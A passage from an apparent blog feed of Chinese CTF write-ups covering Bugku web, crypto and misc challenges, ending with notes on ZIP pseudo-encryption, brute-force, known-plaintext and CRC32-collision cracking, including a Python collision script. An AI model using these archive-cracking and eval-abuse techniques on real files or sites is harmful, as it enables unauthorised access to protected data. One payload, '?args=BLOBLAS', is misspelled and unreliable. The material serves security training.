class="line">              <span class="string">'010101'</span>: <span class="string">'.'</span>,</span><br><span class="line">              <span class="string">'110011'</span>: <span class="string">','</span>,</span><br><span class="line">              <span class="string">'011010'</span>: <span class="string">'@'</span>,</span><br><span class="line">              <span class="string">'111000'</span>: <span class="string">':'</span>,</span><br><span class="line">              <span class="string">'101010'</span>: <span class="string">':'</span>,</span><br><span class="line">              <span class="string">'10001'</span>: <span class="string">'='</span>,</span><br><span class="line">              <span class="string">'011110'</span>: <span class="string">"'"</span>,</span><br><span class="line">              <span class="string">'101011'</span>: <span class="string">'!'</span>,</span><br><span class="line">              <span class="string">'001101'</span>: <span class="string">'_'</span>,</span><br><span class="line">              <span class="string">'010010'</span>: <span class="string">'"'</span>,</span><br><span class="line">              <span class="string">'10110'</span>: <span class="string">'('</span>,</span><br><span class="line">              <span class="string">'1111011'</span>: <span class="string">'&#123;'</span>,</span><br><span class="line">              <span class="string">'1111101'</span>: <span class="string">'&#125;'</span>&#125;</span><br><span class="line">value = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> item == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    value += dictionary[item]</span><br><span class="line">print(<span class="string">'\nCapital: \n'</span>, value)</span><br><span class="line">print(<span class="string">'\nLower case: \n'</span>, value.lower(), <span class="string">'\n\nwww.axiaowei.cn'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> ASCII </tag>
            
            <tag> 加密 </tag>
            
            <tag> Morse </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-easy_crypto</title>
      <link href="/2019/01/26/201920/"/>
      <url>/2019/01/26/201920/</url>
      
        <content type="html"><![CDATA[<p>easy_crypto-writeup<br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiuiicjqj30co0al74c.jpg" alt=""><br>一个看似跟二进制相似的一串密文<br>观察这一串密文，每一组都是由0和1组成，有长有短，刚开始还以为是ascii转换<br>折腾了挺久，想了下会不会是Morse莫尔斯电码。找了下资料，找到了他们的对应关系。<br>可参考<a href="https://axiaowei.cn/2019/01/26/201921/#more">Morse与ASCII码的对应关系</a><br>找到这个剩下的就是将其对应的转换成相应的字符了<br>可以使用我写的一个ascii2morse工具<br>下载地址：<a href="https://github.com/alixiaowei/ascii2morse-tool" target="_blank" rel="noopener">https://github.com/alixiaowei/ascii2morse-tool</a><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiun8vdlj30o90kj74t.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> ASCII </tag>
            
            <tag> 加密 </tag>
            
            <tag> Morse </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-变量1</title>
      <link href="/2019/01/25/201919/"/>
      <url>/2019/01/25/201919/</url>
      
        <content type="html"><![CDATA[<p><strong>变量1-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiv5quolj30du0ahaa1.jpg" alt=""><br>点击访问链接<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiva4tg3j30h208jdft.jpg" alt=""><br>得到一串php代码提示<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  <span class="comment">//关闭错误报告（报错不显示）</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;  <span class="comment">//引用flag1.php文件代码</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);  <span class="comment">//语法高亮</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;  <span class="comment">//检查变量是否声明</span></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];  <span class="comment">//赋值给变量$args</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;  </span><br><span class="line"><span class="comment">//!preg_match 不匹配, ^匹配字符串的开始，\w匹配字母或数字或下划线或汉字等价于'[^A-Za-z0-9_]',$匹配字符串的结束 这里达到过滤作用。</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);   <span class="comment">//输出args error!并退出当前脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line"><span class="comment">//eval()将字符串作为php代码执行,var_dump()函数 打印变量的相关信息,显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。$$args可变变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">可变变量（Variable variables）</span><br><span class="line">可变变量是一种独特的变量，他允许动态改变一个变量的名称。其工作原理是该变量的名称由另外一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“$”。</span><br><span class="line">下面举一个例子，实例代码如下：</span><br><span class="line">&lt;?php</span><br><span class="line">$args = <span class="string">"xiaowei"</span>;  <span class="regexp">//</span>声明变量$args</span><br><span class="line">$xiaowei = <span class="string">"www.axiaowei.cn"</span>;  <span class="regexp">//</span>声明变量$xiaowei</span><br><span class="line">echo $args; <span class="regexp">//</span>输出变量$args</span><br><span class="line">echo <span class="string">"\n"</span>; <span class="regexp">//</span>换行</span><br><span class="line">echo $$args; <span class="regexp">//</span>通过可变变量输出$xiaowei的值</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kivfp75pj30rh05zmxb.jpg" alt=""><br>再看提示的第一句话flag in the variable! （#flag在变量中）<br>上述的可变变量简单来说$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名<br>我们测试php的中的超全局变量，将其变量名传入<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">超全局变量 — 超全局变量是在全部作用域中始终可用的内置变量</span><br><span class="line">超全局变量:</span><br><span class="line"><span class="variable">$GLOBALS</span>：[一个包含了全部变量的全局组合数组]</span><br><span class="line"><span class="variable">$_SERVER</span>:[是预定义服务器变量的一种,所有<span class="variable">$_SERVER</span>开头的都是预定义服务变量]</span><br><span class="line"><span class="variable">$_GET</span>：[用于获取url地址栏的参数数据]</span><br><span class="line"><span class="variable">$_POST</span>： [用于接收<span class="keyword">post</span>提交的数据]</span><br><span class="line"><span class="variable">$_FILES</span>：[用于文件就收的处理img 最常见]</span><br><span class="line"><span class="variable">$_COOKIE</span>： [用于获取与setCookie()中的name 值]</span><br><span class="line"><span class="variable">$_SESSION</span>： [用于存储session的值或获取session中的值]</span><br><span class="line"><span class="variable">$_REQUEST</span>：[具有get,<span class="keyword">post</span>的功能，但比较慢]</span><br><span class="line"><span class="variable">$_ENV</span>：[ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</span><br></pre></td></tr></table></figure></p><p>直接构造payload：?args=BLOBLAS<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kivlhu1kj31190bidgf.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-本地包含</title>
      <link href="/2019/01/25/201918/"/>
      <url>/2019/01/25/201918/</url>
      
        <content type="html"><![CDATA[<p><strong>本地包含-writeup</strong><br><a id="more"></a><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kivx2itbj30dw0alglm.jpg" alt=""><br>访问链接，显示123，查看源代码，没有任何提示，尝试了几个常见的本地包含的姿势，输入什么都是123,也不报错，并没有什么用<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiw1lh0tj30yk0grdgk.jpg" alt=""><br>试着用御剑扫描一下，出来了个flag.php（没有的可以自己往字典里加）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiw6dlksj30ly0f1t97.jpg" alt=""><br>访问flag出来了（很迷？？？）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiwasnf3j30ie05zglj.jpg" alt=""><br>个人感觉这个环境应该是已经玩坏了-_-!</p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-你必须让他停下</title>
      <link href="/2019/01/24/201917/"/>
      <url>/2019/01/24/201917/</url>
      
        <content type="html"><![CDATA[<p><strong>你必须让他停下-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kix0g3frj30dw0bqmx9.jpg" alt=""><br>点击访问链接，无限刷新，查看源代码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kix4rj1dj318s0iqjsh.jpg" alt=""><br>发现js中，如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myrefresh</span>(<span class="params"></span>)</span>&#123;   <span class="comment">//声明一个函数</span></span><br><span class="line"><span class="built_in">window</span>.location.reload();  <span class="comment">//重新加载当前文档。</span></span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="string">'myrefresh()'</span>,<span class="number">500</span>);  <span class="comment">//在指定得毫秒数（500）调用函数</span></span><br><span class="line"><span class="number">1000</span>毫秒 = <span class="number">1</span>秒</span><br></pre></td></tr></table></figure></p><p>你也可以跟我一样，那么准，当显示10.jpg（大概有15张jpg）得页面得时候按pc上的ESC，让页面停止，按F12查看flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kixa52hgj31490kjaaz.jpg" alt=""><br>想其flag显示在页面上可以把标签中得style=”display:none”中去掉就可以了（并没有什么用，能得到flag就可以了）<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">display</span>:none</span><br><span class="line">将元素的显示设为无，即在网页中不占任何的位置。</span><br></pre></td></tr></table></figure></p><p>我讲一下其他几种方式吧，毕竟上面得操作有点看手速[掩面]<br><strong>view-source </strong><br>可以利用view-source:查看源代码，然后在当前页面一直刷新（F5），直到flag出现。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kixffo2yj30nz0b7glu.jpg" alt=""></p><p><strong>抓包工具</strong>(这里我用得是burp suite)<br>抓取到页面，发送到Repeater，一直点击go，很快就会出现得<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kixko12yj30wj0io76o.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-域名解析</title>
      <link href="/2019/01/24/201916/"/>
      <url>/2019/01/24/201916/</url>
      
        <content type="html"><![CDATA[<p><strong>域名解析-writeup</strong><br><a id="more"></a><br>打开题目：<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kixsmyifj30e20aqdfw.jpg" alt=""><br>首先打开链接，访问显示404<br>根据题目要求把flag.baidu.com解析到123.206.87.240应该就可以拿到flag<br><strong>Windows平台</strong><br>修改C:\Windows\System32\drivers\etc下得hosts文件添加一条解析记录（如果出现修改权限不足的问题，可以利用替换）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kixy1kw9j30fv02l3yd.jpg" alt=""><br>然后访问flag.baidu.com就可以看到flag了。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiy4aeqrj30fb050744.jpg" alt=""><br><strong>Linux平台（如kali）</strong><br>直接编辑etc/hosts文件添加一条解析记录<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiy9bvkhj30kd0dgjsu.jpg" alt=""><br>一样，直接访问flag.baidu.com就可以到flag了<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiyd4dvnj30mj0c53z0.jpg" alt=""></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">host</span></span><br><span class="line"><span class="symbol">Hosts</span>是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的<span class="built_in">IP</span>地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的<span class="built_in">IP</span>地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行<span class="built_in">IP</span>地址的解析。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-一个普通的压缩包(xp0intCTF)</title>
      <link href="/2019/01/23/201911/"/>
      <url>/2019/01/23/201911/</url>
      
        <content type="html"><![CDATA[<p><strong>一个普通的压缩包(xp0intCTF)-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj19ih38j30dx0b53yl.jpg" alt=""><br>下载得到一个rar压缩包附件，解压打开发现还有一个flag.rar，文件属性，详细信息各种查看确定没有隐藏信息，进行再次解压出现提示png文件损坏<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj1fq7avj312x0gl0ug.jpg" alt=""><br>先打开里面的文本看一下，文本内容提示flag is not here，现在把flag.rar放在十六进制工具里看下，发现里面有一张secret.png文件，但是之前提示损坏了，刚开始用winrar自带的修复功能修复不成功，只能自己用010Editor进行手动修复了。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj1k7jz7j30te0b0ab7.jpg" alt=""><br>检查rar头，没有问题，然后再看加密部分，检查各个文件的文件头<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件头（FILE_HEAD）</span><br><span class="line">HEAD_TYPE <span class="number">1</span> 个字节 头类型：<span class="number">0x74</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj1ot6e6j30jf07ygnx.jpg" alt=""><br>更多可以点击<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" title="RAR文件格式的研究" target="_blank" rel="noopener">RAR文件格式研究</a><br>我们回到我们的题目中来，检查发现png那的文件头类型A8 3C 7A，把7A修改为74，保存，查看是否修复成功。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj1yve7sj30nq0cdmyp.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj27n4smj30p30cywee.jpg" alt=""><br>得到secret.png，查看一张纯白的图片，用010Editor查看是一个gif的文件<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF文件头标识 (<span class="number">6</span> bytes) <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span>(<span class="number">37</span>) <span class="number">61</span>—— GIF89(<span class="number">7</span>)a</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj2ehk35j30gr08yjs4.jpg" alt=""><br>修改为gif用stegsolve查看得到gif的两帧每一帧有半张二维码(这里也可以用Photoshop进行分离图层)<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StegSolve</span><br><span class="line">Analyse下面几个功能键作简单介绍：</span><br><span class="line"><span class="keyword">File</span> <span class="keyword">Format</span>:文件格式，这个主要是查看图片的具体信息</span><br><span class="line">Data <span class="keyword">Extract</span>:数据抽取，图片中隐藏数据的抽取</span><br><span class="line"><span class="keyword">Frame</span> Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看</span><br><span class="line"><span class="keyword">Image</span> Combiner:拼图，图片拼接</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj2kw6xij30g60b0jrp.jpg" alt=""><br>用Photoshop将这两块进行拼接成完整的二维码，利用QR扫描（手机扫也一样的）得到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj2ptbj4j30tu0ifdhn.jpg" alt=""><br><strong><a href="https://coolshell.cn/articles/10590.html#jtss-tsina" title="二维码的生成细节和原理" target="_blank" rel="noopener">二维码的生成细节和原理</a></strong>有兴趣的可以去了解下。</p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip文件格式说明</title>
      <link href="/2019/01/22/201914/"/>
      <url>/2019/01/22/201914/</url>
      
        <content type="html"><![CDATA[<p><strong>zip文件格式</strong><br><a id="more"></a><br>zip文件由三部分组成：压缩的文件内容源数据、压缩的目录源数据、目录结束标识的结构<br>①压缩文件内容的源数据：<br>记录着压缩的所有文件的内容信息，其数据组织结构是对于每个文件都由File header 、File data 、 Data descriptor 三部分组成。<br>File header（文件头）：用于标识该文件的开始，结构说明如下：<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj3wotopj30e20950sy.jpg" alt=""><br>File data(文件数据)：相应压缩文件的源数据。<br>Data descriptor（数据描述符）：<br>用于标识该文件压缩结束，该结构只有在相应的local file header中通用标记字段的第３bit设为１时才会出现，紧接在压缩文件源数据后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj41run0j30ak034mx0.jpg" alt=""><br>②Central directory 核心目录<br>记录了压缩文件的目录信息，在这个数据区中每一条记录对应再压缩源文件数据区中的一条数据。<br>核心目录结构：<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj46hrmyj30e30deq3d.jpg" alt=""><br>③End of central directory record(EOCD) 目录结束标识<br>目录结束标识存于整个归档包的结尾，用于标记压缩目录数据的结束。每个压缩文件必须有且只有一个EOCD记录。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj4b4g2pj30d306rjri.jpg" alt=""></p><p><strong>官方文档：<a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt" target="_blank" rel="noopener">https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip压缩包--加密破解篇</title>
      <link href="/2019/01/22/201915/"/>
      <url>/2019/01/22/201915/</url>
      
        <content type="html"><![CDATA[<p><strong>伪加密、爆破、明文攻击、CRC32碰撞</strong><br><a id="more"></a><br>zip文件格式：<br>zip文件由三部分组成：压缩的文件内容源数据、压缩的目录元数据、目录结束标识结构<br>详情点击：<strong><a href="https://axiaowei.cn/2019/01/22/201914/">zip格式说明</a></strong></p><h5 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h5><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj4sv9npj30p60aa75j.jpg" alt=""><br>若是没有加密的zip文件，两处标记都是00 00<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj4zuh1fj30rj09qq3w.jpg" alt=""><br>如果是加密的zip文件，两处都标记的是09 00（注意不同的压缩软件有差异，有些好像是01 00）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj54dj0gj30x20aemy7.jpg" alt=""><br>若将未加密的zip文件中的压缩源文件目录区的全局方式位标记改为01 00 （或者09 00），就会被压缩软件认为已加密，这就是所谓的伪加密了<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj58sz7mj312l0c2400.jpg" alt=""><br>破解伪加密的zip，只要把压缩文件目录区的全局方式标记改为00 00 （除windows外的系统（如kali）可直接打开伪加密压缩包）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj5do5uij30z80bwdhj.jpg" alt=""></p><h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><p>爆破：逐个尝试选定集合中的可以组成的所有密码，直到遇到正确的密码。<br>分为暴力破解、掩码破解、字典破解这几种<br>1、暴力破解：选择密码范围，长度等，由软件组合生成密码进行破解<br>2、掩码破解：知道密码中的一部分，只需要按照规则构造其余部分进行破解<br>3、字典破解：通常是多数用户常用的一些密码集合，导入字典文件用字典中的密码进行破解（取决你的字典）<br>这里可以使用Windows下的一款神器AZPR，也可以自己动手用python写个爆破的脚本。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj5if8ihj30d00cn0ta.jpg" alt=""></p><h5 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h5><p>明文攻击（Known plaintext attack）：是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。<br>明文攻击是一种较为高效的攻击手段，如：当你不知道一个zip压缩包文件的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有压缩文件使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。<br>简单来说就是，zip明文攻击就是利用已知文件找到加密密钥，利用密钥来解释其他加密文件，因为zip压缩包里的所有文件都是使用同一个加密密钥来加密的。<br>这里举个例子：<br>现在我压缩了带密码的四个文件，已知明文攻击测试.zip中的明文攻击.docx<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj5p8es7j30p30cyt9p.jpg" alt=""><br>进行对已知文件进行压缩，对比crc值是否跟加密文件中的crc值一致<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj5viz9vj314y0gpmzq.jpg" alt=""><br>利用AZPR进行明文攻击<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj5viz9vj314y0gpmzq.jpg" alt=""><br>成功获取到密文<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj6cd4g9j30cf05f3yi.jpg" alt=""><br>注意：当明文的大小比较小时，或者密文过长，攻击速度会比较慢；即使有时没有恢复密码，也可以使用明文攻击，最后点保存还是能得到压缩包里内容的，如果出现错误可以多试几款压缩软件。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj6gssbpj30cf05faa2.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj6m09akj31cu0b9dhc.jpg" alt=""></p><h5 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h5><p>CRC32：CRC本身是“冗余校验码”的意思，CRC32则标识会产生一个32bit（8位十六进制）的校验值。  </p><p>CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。</p><p>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。</p><p>每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能力，通常只适用于较小文本文件。</p><p>案例：可以参考我写的<strong><a href="https://axiaowei.cn/2019/01/21/201906/">Bugku-好多压缩包</a></strong>那篇文章。<br>bugku中的例子脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">dicts = string.printable  <span class="comment"># 可打印字符的字符串。ascii码33-126号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision_crc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> out_file</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dicts:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dicts:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dicts:</span><br><span class="line">                    strings = a + b + c + d</span><br><span class="line">                    strings = strings.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(strings)):</span><br><span class="line">                        out_file.write(strings.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">                        <span class="comment"># print(strings)</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                        <span class="comment"># 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">obtain_zip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(i) + <span class="string">'.zip'</span></span><br><span class="line">        zip_file = zipfile.ZipFile(file, <span class="string">'r'</span>)  <span class="comment"># 读取创建zip_file对象</span></span><br><span class="line">        get_crc = zip_file.getinfo(<span class="string">'data.txt'</span>)  <span class="comment"># 压缩文件夹里的data.txt文件，获取文档内指定的文件信息</span></span><br><span class="line">        crc = get_crc.CRC</span><br><span class="line">        <span class="comment">#  以上定义一个方法，获取68个zip的CRC的值</span></span><br><span class="line">        collision_crc(crc)  <span class="comment"># 再调用collision方法传参</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out_file = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">obtain_zip()</span><br><span class="line">out_file.close()</span><br><span class="line"></span><br><span class="line">out_file2 = open(<span class="string">'out.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.rar'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> rar:</span><br><span class="line">    rar.write(base64.b64decode(out_file2.read()))   <span class="comment"># 二进制将转换后的base64位写入文件</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
